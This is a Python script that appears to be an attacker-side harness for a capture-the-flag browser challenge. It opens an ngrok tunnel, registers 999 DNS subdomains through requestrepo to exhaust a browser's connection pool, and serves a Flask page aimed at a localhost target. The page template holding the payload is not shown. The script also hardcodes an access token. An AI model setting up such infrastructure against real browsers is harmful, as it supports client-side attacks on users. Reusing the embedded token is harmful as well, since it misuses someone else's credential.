import asyncio
import httpx
from pyngrok import ngrok
from flask import Flask, render_template
from threading import Thread

from requestrepo import Requestrepo, DnsRecord

DNS_SERVER = Requestrepo(token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MjkyMTc1MDQsImV4cCI6MTczMTg5NTkwNCwic3ViZG9tYWluIjoiMHR2NjY1eWwifQ.C05_eAs6YmCrQr09Dzwcgpza6I6m3Uhq-9l7t9gLOAE", host="requestrepo.com", port=443, protocol="https")
PORT = 4444
TUNNEL = ngrok.connect(PORT, 'tcp').public_url.replace("tcp://", "http://")
TUNNEL = httpx.URL(TUNNEL)

# need different subdomain to fill the browser connection pool
dns = []
for i in range(999):
    dns.append(
        DnsRecord(
            type=2,
            domain=f"{i}",
            value=TUNNEL.host
        )
    )
print(DNS_SERVER.update_dns(dns))
print("Domain:", DNS_SERVER.domain)
print("TUNNEL:", TUNNEL)

URL = "http://localhost/"
URL = httpx.URL(URL)

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, verify=False)

class API(BaseAPI):
    ...

def webServer():
    app = Flask(__name__)
    app.config['TEMPLATES_AUTO_RELOAD'] = True
    @app.get("/zzz")
    def zzz():
        ...
    @app.get("/")
    def home():
        return render_template("./index.html",**dict(
            domain=DNS_SERVER.domain,
            port=TUNNEL.port,
            target=str(URL)
        ))
    return Thread(target=app.run, args=('0.0.0.0', PORT))

async def main():
    api = API()
    server = webServer()
    server.start()
    server.join()

if __name__ == "__main__":
    asyncio.run(main())
